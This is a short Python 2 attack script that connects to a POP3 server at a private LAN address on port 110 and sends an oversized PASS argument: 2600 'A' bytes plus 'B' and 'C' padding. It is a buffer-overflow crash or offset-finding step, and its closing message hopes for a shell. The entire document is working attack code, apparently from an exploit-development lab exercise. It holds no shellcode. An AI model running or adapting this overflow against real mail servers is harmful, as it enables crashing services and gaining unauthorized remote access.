#!/usr/bin/env python

import socket

# payload --
#buffer = "A" * 2600 + "B" * 100
buffer = "A"*2600 + "B"*50 + "C"*50

# here we go --
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('192.168.0.166',110))
    data = s.recv(1024)

    s.send('USER dirtbag' + '\r\n')
    data = s.recv(1024)

    s.send('PASS ' + buffer + '\r\n')
    data = s.recv(1024)
    s.close()

    # out --
    print "\nDone! Wonder if we got that shell back?"
except:
    print "Could not connect to POP3 for some reason..."
